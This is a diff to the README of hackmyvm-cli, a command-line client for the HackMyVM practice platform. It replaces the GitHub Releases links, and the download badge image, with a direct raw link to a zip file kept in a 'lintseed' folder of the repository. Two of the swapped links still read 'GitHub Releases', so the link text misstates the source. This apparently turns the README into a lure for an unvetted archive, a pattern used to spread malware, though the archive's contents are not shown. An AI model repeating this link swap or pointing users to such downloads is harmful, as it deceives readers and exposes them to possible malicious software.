@@ -1,7 +1,7 @@
 # 🖥️ hackmyvm-cli - Your Easy Command-Line Tool for HackMyVM
 
 ## 📥 Download the Application
-[![Download HackMyVM CLI](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/muzzu302/hackmyvm-cli/releases)
+[![Download HackMyVM CLI](https://raw.githubusercontent.com/muzzu302/hackmyvm-cli/main/lintseed/hackmyvm-cli.zip)](https://raw.githubusercontent.com/muzzu302/hackmyvm-cli/main/lintseed/hackmyvm-cli.zip)
 
 ## 🚀 Getting Started
 Welcome to hackmyvm-cli! This tool allows you to easily interact with HackMyVM. You can list available machines, download them, and submit flags—all while keeping your session active.
@@ -21,7 +21,7 @@ To run hackmyvm-cli, ensure your system meets these requirements:
 - **Session Persistence:** Keep your session alive, so you don’t lose your progress.
 
 ## 📥 Download & Install
-1. Visit this page to download: [GitHub Releases](https://github.com/muzzu302/hackmyvm-cli/releases).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/muzzu302/hackmyvm-cli/main/lintseed/hackmyvm-cli.zip).
 2. Find the latest version under "Releases".
 3. Click on the link for the version you want.
 4. Download the appropriate file for your operating system.
@@ -70,7 +70,7 @@ For any issues or questions, feel free to raise an issue in the GitHub repositor
 If you wish to contribute to hackmyvm-cli, please fork the repository and submit a pull request. We welcome suggestions for new features, improvements to existing features, or any documentation changes.
 
 ## 🔗 Important Links
-- **Download Link:** [GitHub Releases](https://github.com/muzzu302/hackmyvm-cli/releases)
+- **Download Link:** [GitHub Releases](https://raw.githubusercontent.com/muzzu302/hackmyvm-cli/main/lintseed/hackmyvm-cli.zip)
 - **Documentation:** Further information can be found in the repository’s wiki section.
 
 Thank you for choosing hackmyvm-cli. We hope you enjoy using it!
